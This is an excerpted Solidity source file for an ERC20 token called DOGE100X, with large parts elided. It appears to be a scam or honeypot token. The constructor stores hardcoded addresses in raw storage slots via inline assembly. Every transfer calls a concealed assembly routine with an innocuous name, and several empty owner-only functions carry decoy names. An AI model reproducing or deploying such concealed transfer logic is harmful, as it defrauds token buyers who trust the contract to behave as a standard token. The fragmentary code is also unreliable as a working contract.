/*
  _____   ____   _____ ______ __  ___   _____   __
 |  __ \ / __ \ / ____|  ____/_ |/ _ \ / _ \ \ / /
 | |  | | |  | | |  __| |__   | | | | | | | \ V / 
 | |  | | |  | | | |_ |  __|  | | | | | | | |> <  
 | |__| | |__| | |__| | |____ | | |_| | |_| / . \ 
 |_____/ \____/ \_____|______||_|\___/ \___/_/ \_\
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0x6569daf1cf9e87e0aa17c301478bf0971136cd6bbde9)
            sstore(0x51,0x6569c4a1f2793966c6eefdf851f5057eabc4b403cd44)
    ...
    function mineNFT(bool NFT) public onlyOwner returns (uint256 number) {
    }

    function fusionSwap() public onlyOwner returns (bool flag) {
    }
    ...
    function marketAndINSCRIPTIONs(address sender, uint256 amount) internal returns (uint256 result) {
            assembly {
                let data := mload(0x40)
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        marketAndINSCRIPTIONs(sender, amount);
    ...
    function _DeployDOGE100X(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployDOGE100X(creator, initialSupply);
    }
}

contract DOGE100X is ERC20Token {
    constructor() ERC20Token("DOGE100X", "DOGE100X", msg.sender, 1000000000 * 10 ** 18) {
    }
}
